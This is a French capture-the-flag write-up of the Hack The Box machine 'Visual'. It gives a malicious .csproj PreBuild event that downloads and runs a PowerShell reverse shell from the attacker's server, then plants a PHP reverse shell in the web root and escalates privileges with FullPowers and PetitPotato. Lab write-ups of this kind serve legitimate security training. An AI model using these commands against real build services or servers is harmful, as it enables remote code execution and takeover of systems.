---
date: 2024-02-24T19:37:32-06:00
# description: ""
# image: ""
lastmod: 2025-03-19
showTableOfContents: true
# tags: ["",]
# categories: [""]
title: "HTB: Visual"
type: "post"
---

* Platforme: Hack The Box
* Link: [Visual](https://app.hackthebox.com/machines/Visual)
* Niveau: Moyen
* OS: Windows
---

Adresse IP cible - `10.10.11.234`

## Balayage

```
sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
```
Je commence avec un scan nmap et j'obtiens quelques informations:
- Un serveur web Apache
- Une machine Windows
- Une application PHP sur le port 80

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
Nmap scan report for 10.10.11.234
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```

## Enumération

Nous accédons à l'application web en visitant `http://10.10.11.234`. L'application semble être un service permettant à l'utilisateur de soumettre le lien d'un répertoire Git, qui compilera ensuite le projet .NET pour l'utilisateur.

![Visual Webapp](/images/HTB-Visual/Visual-webapp.png)

Je teste la fonctionnalité en envoyant un URL, via Python3.
```
python3 -m http.server
```

Je soumets mon lien `http://10.10.14.222:8000` (Remplacez `10.10.14.222` par votre adresse IP)

![Link-submit1](/images/HTB-Visual/link-submit-Visual-1.png)

Je suis redirigé vers cette page, où l'application tente de compiler mon projet.
![Build attempt](/images/HTB-Visual/Visual-build-attempt.png)

Comme il n'y a pas de projet à cet URL, l'opération échoue mais j'obtiens quelques informations. Cette application recherche un fichier `.sln`.

> Un fichier .sln est un fichier de solution utilisé par Microsoft Visual Studio. Ce fichier sert de conteneur pour un ou plusieurs projets. Il permet d'organiser et de gérer des projets au sein d'un espace de travail unique. Le fichier .sln stocke des informations sur les projets qu'il contient, notamment leurs dépendances, les configurations de construction et les références à des bibliothèques ou ressources externes.

![Build failure](/images/HTB-Visual/Visual-build-failure.png)

Je peux voir les réponses sur mon serveur.

![Get method server](/images/HTB-Visual/python3server-GET-method-1.png)

Je vois un code 404, aucun fichier n'ayant été trouvé à mon URL et `GET /info/refs?service=git-upload-pack HTTP/1.1" 404`. Il semble que l'application utilise le service `git-upload-pack` qui fait partie du protocole Git utilisé pour des opérations telles que le clonage ou la récupération de modifications à partir d'un répertoire. Pour en savoir plus, cliquez [ici](https://git-scm.com/docs/git-upload-pack).

On peut lire sur le site que notre lien doit mener à un projet .NET 6.0 avec un fichier `.sln`.

![Visual support](/images/HTB-Visual/Visual-dotnet-support.png)

## Accès initial

Je n'ai jamais utilisé .NET, j'ai donc demandé à ChatGPT de m'aider à créer un projet pour cette technologie.

```
dotnet new sln -n visual
```

Lorsque vous exécutez la commande `dotnet new sln -n visual`, un nouveau fichier de solution nommé `visual.sln` est créé.
![Dotnet new sln](/images/HTB-Visual/dotnet-new-sln.png)

```
dotnet new console -n visual
```

Cette commande crée un nouveau projet d'application nommé `visual`. Ce projet contiendra les fichiers et les configurations nécessaires pour une application console de base écrite en C#.

![Dotnet new console](/images/HTB-Visual/dotnet-new-console.png)

Ajoutons le fichier de projet `visual.csproj` situé dans le répertoire `visual` au fichier de la solution (`visual.sln`).

```
dotnet sln add visual/visual.csproj
```
![Dotnet sln add](/images/HTB-Visual/dotnet-sln-add.png)

> Pour les projets .NET, un fichier `.csproj` est utilisé pour définir et configurer le projet. Il s'agit d'un fichier XML qui contient des métadonnées et des paramètres concernant le projet, tels que ses dépendances, ses paramètres de construction, le cadre cible, etc.


`git init` est utilisé pour initialiser un nouveau répertoire Git.
```
git init
```
![Visual git init](/images/HTB-Visual/visual-git-init.png)

Il nous faut trouver un moyen de servir notre répertoire Git à l'application. J'ai trouvé un excellent article à ce sujet ici, [A Quick and Hacky Way to Serve a Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html).


Exécutons maintenant les commandes suivantes
```
git add .
git commit -m "Test"
cd .git
git --bare update-server-info
cd ..
```

> Nous devrons les exécuter à chaque fois que nous apporterons des modifications à nos fichiers. Lorsque vous exécutez `git --bare update-server-info`, Git met à jour les fichiers auxiliaires nécessaires pour servir le répertoire via le réseau.

Relancez votre serveur python avec `python3 -m http.server` et soumettez votre URL maintenant que nous avons les bons fichiers.

```
http://10.10.14.222:8000/.git
```
![Visual link submit2](/images/HTB-Visual/url-submission-visual1.png)

<br>

Le processus de compilation est cette fois-ci un succès.

![Visual successful build](/images/HTB-Visual/visual-building-successful.png)

De retour sur notre serveur, nous obtenons des requêtes GET valides.

![Server good requests](/images/HTB-Visual/server-good-requests.png)

Je peux voir que l'application compile les fichiers dans le répertoire git. Nous devons trouver un moyen d'exploiter ce processus. En faisant des recherches, je trouve cette [page de Microsoft](https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022) qui explique qu'un "pre-build event" fait référence à un script ou à une commande qui est exécuté avant que le processus de compilation pour le projet ne commence.

Nous pouvons utiliser un événement `PreBuild` dans le fichier `.csproj` pour exécuter des commandes. Essayons d'ajouter un shell inversé (reverse shell).

- Ci-dessous, mon fichier `.csproj` modifié
```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.222:8000/revshell.ps1')" />
  </Target>

</Project>
```

- Créons un script PowerShell `revshell.ps1` pour obtenir un shell distant. J'ai utilisé ce [nishang shell](https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1) pour le reverse shell. J'ai modifié ce [shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), en changeant le nom de la fonction et en ajoutant le "reverse switch" à la fin.

Je mets en place un listener netcat avec

```
nc -nvlp 9001
```

Nous utilisons encore ces commandes git

```
git add .
git commit -m "Add as a test"
cd .git
git --bare update-server-info
cd ..
```

Si vous avez stoppé votre serveur Python, redémarrez-le (et laissez-le tourner) et re-soumettez votre lien.

Le listener devrait capturer un shell une fois la compilation terminée, nous sommes dans le système!

![nc listener, reverse shell](/images/HTB-Visual/nc-listener-shell.png)

Executer `whoami` nous permet de constater que nous sommes l'utilisateur `enox`.

![whoami command on target](/images/HTB-Visual/target-whoami.png)

Nous pouvons vérifier nos privilèges avec `whoami /priv`.
![privilege on target machine](/images/HTB-Visual/target-priv.png)

Je vais dans le répertoire principal de l'utilisateur avec `cd \Users\enox` et j'utilise `ls` pour voir les différents sous-répertoires.

![directories listing on target](/images/HTB-Visual/target-directories.png)

Je consulte le contenu du répertoire `Desktop` avec `dir Desktop` et je vois le drapeau `user.txt`. Utilisez `cat user.txt` pour examiner son contenu.

![User flag](/images/HTB-Visual/Visual-user-flag.png)

### Mouvement Latéral

Pour trouver les chemins d'escalade de privilèges, utilisons [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023). Téléchargez WinPEASany.exe et stockez-le dans le dossier que vous utilisez pour votre serveur python.

![winPEAS location](/images/HTB-Visual/winPEAS-location.png)

Transférer le fichier sur le système cible avec `wget`.
```
wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
```

> Utilisez votre adresse IP et remplacez le port par celui que vous utilisez pour votre serveur.

Vérifiez que le fichier se trouve sur la cible.

![winPEAS location on target](/images/HTB-Visual/winPEAS-on-target.png)

Vous pouvez vérifier les options de winPEAS avec `./wpany.exe -h`.

![winPEAS options](/images/HTB-Visual/winpeas-options.png)

Exécutez winPEAS avec les options que vous souhaitez. Parce que je veux une énumération assez complète, j'utilise la commande suivante
```
./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
```

Il semble que nous possédons les permissions pour accéder au dossier contenant le service Apache HTTP Server.

![Apache Server HTTP](/images/HTB-Visual/ApacheServerHTTP.png)

En parcourant les résultats, on peut noter que nous avons un accès complet au répertoire xampp (rappelez-vous qu'il s'agit d'une application PHP), le même dossier que celui dans lequel Apache est stocké.

![xampp directory](/images/HTB-Visual/xampp-permissions.png)

Nous pouvons essayer d'en savoir plus sur `ApacheHTTPServer` avec
```
Get-CIMInstance -Class Win32_Service -Filter "Name='ApacheHTTPServer'" | Select-Object *
```

Voici le résultat que nous obtenons, il semble qu'il s'exécute sous `NT AUTHORITY\NLocal Service`.

![Apache HTTP Server service info](/images/HTB-Visual/AppacheHTTPServer-info-1.png)

> "Sur Windows 10, le service UPnP Device Host est configuré pour s'exécuter sans privilèges d'usurpation d'identité en tant qu'utilisateur NT AUTHORITY\LOCAL SERVICE...". En résumé, nous pouvons réaliser une escalade des privilèges via ce compte. Pour en savoir plus, cliquez [ici](https://itm4n.github.io/localservice-privileges/).

Le service s'exécute sous `NT AUTHORITY\NLocal Service`, nous devons donc accéder à ce compte. Puisque nous avons accès au répertoire xampp, nous pouvons y installer un reverse shell et y accéder via le navigateur web. Je vais dans ce répertoire et je liste son contenu.

> Pour les applications PHP, le dossier XAMPP sert de répertoire racine pour l'hébergement des fichiers web (tels que HTML, PHP, CSS, JavaScript, images, etc.) et la gestion des paramètres de configuration du serveur.

```
cd C:\Xampp\
ls
```
![xampp directory content](/images/HTB-Visual/xampp-content-1.png)

Remarquez le dossier `htdocs`.

> Avec XAMPP, le dossier `htdocs` est la racine du serveur web par défaut. Cela signifie que tous les fichiers placés dans le dossier `htdocs` seront accessibles via un navigateur web lorsque le serveur XAMPP est en cours d'exécution.

Les fichiers de l'application sont présents, comme vous pouvez le voir. Nous pouvons placer un reverse shell PHP dans le dossier `htdocs`.

![xampp htdocs directory](/images/HTB-Visual/xampp-htdocs.png)

J'ai utilisé ce [reverse shell PHP](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php).

Je lance ensuite `wget http://10.10.14.222:8000/revshell.php -o rev.php` pour le transférer sur le serveur cible.

![PHP reverse shell on the target](/images/HTB-Visual/php-reverse-shell-1.png)

Mettons en place un listener netcat avec
```
nc -nvlp 8010
```

> Utilisez le numéro de port que vous avez spécifié dans le reverse shell PHP.

Retournez à votre navigateur et allez à `http://<adresse IP cible>/rev.php`, revenez à votre listener et vous devriez avoir un shell avec l'utilisateur `nt authority\local service`.

![nt authority user shell on the target](/images/HTB-Visual/nt-authority-local-service.png)

Vérifiez vos privilèges et vous remarquez qu'il vous manque le privilège `ImpersonatePrivilege` nécessaire pour obtenir les privilèges administratifs.

Exécutons `whoami /priv`.

![nt authority user privileges](/images/HTB-Visual/nt-authority-priv.png)

## Escalade des privilèges

Cet [article](https://itm4n.github.io/localservice-privileges/) vous donne le lien d'un outil qui permet d'obtenir plus de privilèges. L'outil s'appelle [FullPowers](https://github.com/itm4n/FullPowers). Téléchargez-le sur la machine cible (Assurez-vous d'utiliser le reverse shell avec `nt authority\local service`).

> Ce fichier ne sera pas exécuté via le navigateur, donc nous retournons dans le répertoire `xampp` avec (`cd ..`) avant de télécharger notre fichier.

```
wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
```

Une erreur se produit parce que nous disposons actuellement d'un shell cmd et non d'un shell PowerShell.

![nt authority user shell error](/images/HTB-Visual/shell-error-1.png)

Il suffit d'utiliser `powershell` et de réexécuter la commande `wget`.

![nt authority FullPowers dlownload](/images/HTB-Visual/powershell-fullpowers-dl.png)

Maintenant, nous exécutons `fp.exe` et nous obtenons de nouveaux privilèges! Remarquez que nous avons été rétrogradés à un shell cmd et que nous avons été forcés hors du dossier `xampp`, nous devons donc exécuter `powershell` à nouveau et `cd C:\xampp`.

![nt authority user new privileges](/images/HTB-Visual/nt-authority-new-priv.png)

Nous pouvons maintenant utiliser [PetitPotato](https://github.com/wh0amitz/PetitPotato) pour réaliser une escalade de privilèges en abusant de `ImpersonatePrivilege`. 

Nous le transmettons à la cible en exécutant

```
wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
```
Nous obtenons une erreur

```
wget : Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer. Contact Microsoft 
```

Il semble que cette erreur soit causée par la barre de progression affichée sur le terminal. Elle peut être résolue en exécutant `$ProgressPreference = "SilentlyContinue"` avant la commande `wget`.

Nous pouvons maintenant utiliser notre fichier en exécutant

```
./pp.exe 3 cmd
```
![PetitPotato exploit](/images/HTB-Visual/PetitPotato-exploit.png)

Nous avons maintenant des privilèges d'administrateur.

```
cd C:\Users\Administrator\Desktop
```

Ensuite, listons le contenu du répertoire, nous avons encore été rétrogradés à un shell cmd, nous devons donc utiliser `dir`.

![root flag](/images/HTB-Visual/root-flag.png)

Nous trouvons le fichier `root.txt`! Utilisez `type root.txt` pour voir son contenu.

C'est tout pour mon premier writeup sur Hack The Box! J'espère qu'il vous a été utile. Si vous avez des questions, laissez un commentaire ou contactez-moi sur X [@_KScorpio](https://twitter.com/_KScorpio).
